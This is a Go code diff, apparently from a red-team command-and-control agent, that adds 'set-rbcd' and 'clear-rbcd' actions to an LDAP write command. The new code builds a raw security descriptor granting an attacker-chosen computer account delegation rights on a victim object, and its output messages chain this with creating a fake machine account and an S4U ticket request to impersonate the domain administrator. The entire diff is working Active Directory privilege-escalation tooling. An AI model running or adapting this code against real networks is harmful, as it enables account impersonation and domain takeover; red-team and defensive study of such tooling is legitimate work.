@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"strconv"
@@ -34,7 +35,7 @@ type ldapWriteArgs struct {
 }
 
 func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
-	allActions := "add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object"
+	allActions := "add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object, set-rbcd, clear-rbcd"
 	if task.Params == "" {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Error: parameters required. Use -action <%s> -server <DC>", allActions),
@@ -75,6 +76,7 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		"set-attr": true, "add-attr": true, "remove-attr": true,
 		"set-spn": true, "disable": true, "enable": true, "set-password": true,
 		"add-computer": true, "delete-object": true,
+		"set-rbcd": true, "clear-rbcd": true,
 	}
 	if !validActions[action] {
 		return structs.CommandResult{
@@ -152,6 +154,10 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		return ldapAddComputer(conn, args, baseDN)
 	case "delete-object":
 		return ldapDeleteObject(conn, args, baseDN)
+	case "set-rbcd":
+		return ldapSetRBCD(conn, args, baseDN)
+	case "clear-rbcd":
+		return ldapClearRBCD(conn, args, baseDN)
 	default:
 		// Unreachable — action is validated before connection
 		return structs.CommandResult{Output: "Unknown action", Status: "error", Completed: true}
@@ -694,9 +700,9 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 			"[+] Password:      (set)\n"+
 			"[+] UAC:           WORKSTATION_TRUST_ACCOUNT (0x1000)\n"+
 			"[+] Server:        %s\n"+
-			"\n[!] Use with RBCD: ldap-write -action set-attr -target <victim> -attr msDS-AllowedToActOnBehalfOfOtherIdentity ...\n"+
+			"\n[!] Next: ldap-write -action set-rbcd -target <victim> -value %s\n"+
 			"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
-			computerDN, samName, args.Server),
+			computerDN, samName, args.Server, samName),
 		Status:    "success",
 		Completed: true,
 	}
@@ -736,4 +742,171 @@ func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 		Status:    "success",
 		Completed: true,
 	}
+}
+
+func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
+	if args.Target == "" || args.Value == "" {
+		return structs.CommandResult{
+			Output:    "Error: -target (victim service account/computer) and -value (delegated account sAMAccountName, e.g. FAKEPC01$) are required",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error resolving target: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Resolve the delegated account and get its objectSid
+	delegatedDN, err := ldapResolveDN(conn, args.Value, baseDN)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error resolving delegated account '%s': %v", args.Value, err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Fetch the objectSid of the delegated account
+	searchReq := ldap.NewSearchRequest(
+		delegatedDN,
+		ldap.ScopeBaseObject,
+		ldap.NeverDerefAliases,
+		1, 10, false,
+		"(objectClass=*)",
+		[]string{"objectSid"},
+		nil,
+	)
+
+	result, err := conn.Search(searchReq)
+	if err != nil || len(result.Entries) == 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error fetching objectSid for '%s': %v", args.Value, err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	sid := result.Entries[0].GetRawAttributeValue("objectSid")
+	if len(sid) < 8 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: invalid objectSid for '%s' (length %d)", args.Value, len(sid)),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Build self-relative security descriptor with DACL granting GENERIC_ALL to the SID
+	sd := buildRBCDSecurityDescriptor(sid)
+	sidStr := adcsParseSID(sid)
+
+	// Set msDS-AllowedToActOnBehalfOfOtherIdentity
+	modReq := ldap.NewModifyRequest(targetDN, nil)
+	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd)})
+
+	if err := conn.Modify(modReq); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error setting RBCD delegation: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output: fmt.Sprintf("[*] LDAP RBCD Configuration (T1134.001)\n"+
+			"[+] Target:    %s\n"+
+			"[+] Delegated: %s (%s)\n"+
+			"[+] SID:       %s\n"+
+			"[+] Server:    %s\n"+
+			"\n[!] %s can now impersonate users to services on %s\n"+
+			"[!] Next: ticket -action s4u ...\n",
+			targetDN, delegatedDN, args.Value, sidStr, args.Server, args.Value, args.Target),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
+	if args.Target == "" {
+		return structs.CommandResult{
+			Output:    "Error: -target (object to clear RBCD from) is required",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error resolving target: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Clear msDS-AllowedToActOnBehalfOfOtherIdentity by replacing with empty value
+	modReq := ldap.NewModifyRequest(targetDN, nil)
+	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})
+
+	if err := conn.Modify(modReq); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error clearing RBCD delegation: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output: fmt.Sprintf("[*] LDAP RBCD Cleared\n"+
+			"[+] Target: %s\n"+
+			"[+] Cleared: msDS-AllowedToActOnBehalfOfOtherIdentity\n"+
+			"[+] Server: %s\n", targetDN, args.Server),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+// buildRBCDSecurityDescriptor creates a self-relative security descriptor
+// with a DACL containing one ACCESS_ALLOWED_ACE granting GENERIC_ALL to the given SID.
+func buildRBCDSecurityDescriptor(sid []byte) []byte {
+	sidLen := len(sid)
+	aceSize := 8 + sidLen            // ACE header (4) + mask (4) + SID
+	aclSize := 8 + aceSize           // ACL header (8) + ACE
+	sdSize := 20 + aclSize           // SD header (20) + DACL
+
+	sd := make([]byte, sdSize)
+
+	// Security descriptor header (self-relative)
+	sd[0] = 1              // Revision
+	sd[1] = 0              // Sbz1
+	binary.LittleEndian.PutUint16(sd[2:4], 0x8004) // Control: SE_DACL_PRESENT | SE_SELF_RELATIVE
+	binary.LittleEndian.PutUint32(sd[4:8], 0)      // OffsetOwner (none)
+	binary.LittleEndian.PutUint32(sd[8:12], 0)     // OffsetGroup (none)
+	binary.LittleEndian.PutUint32(sd[12:16], 0)    // OffsetSacl (none)
+	binary.LittleEndian.PutUint32(sd[16:20], 20)   // OffsetDacl (right after header)
+
+	// ACL header
+	daclOff := 20
+	sd[daclOff] = 2        // AclRevision
+	sd[daclOff+1] = 0      // Sbz1
+	binary.LittleEndian.PutUint16(sd[daclOff+2:daclOff+4], uint16(aclSize))
+	binary.LittleEndian.PutUint16(sd[daclOff+4:daclOff+6], 1)  // AceCount
+	binary.LittleEndian.PutUint16(sd[daclOff+6:daclOff+8], 0)  // Sbz2
+
+	// ACCESS_ALLOWED_ACE
+	aceOff := daclOff + 8
+	sd[aceOff] = 0x00      // AceType: ACCESS_ALLOWED_ACE_TYPE
+	sd[aceOff+1] = 0x00    // AceFlags
+	binary.LittleEndian.PutUint16(sd[aceOff+2:aceOff+4], uint16(aceSize))
+	binary.LittleEndian.PutUint32(sd[aceOff+4:aceOff+8], 0x000F003F) // GENERIC_ALL equivalent for RBCD
+
+	// SID
+	copy(sd[aceOff+8:], sid)
+
+	return sd
 }
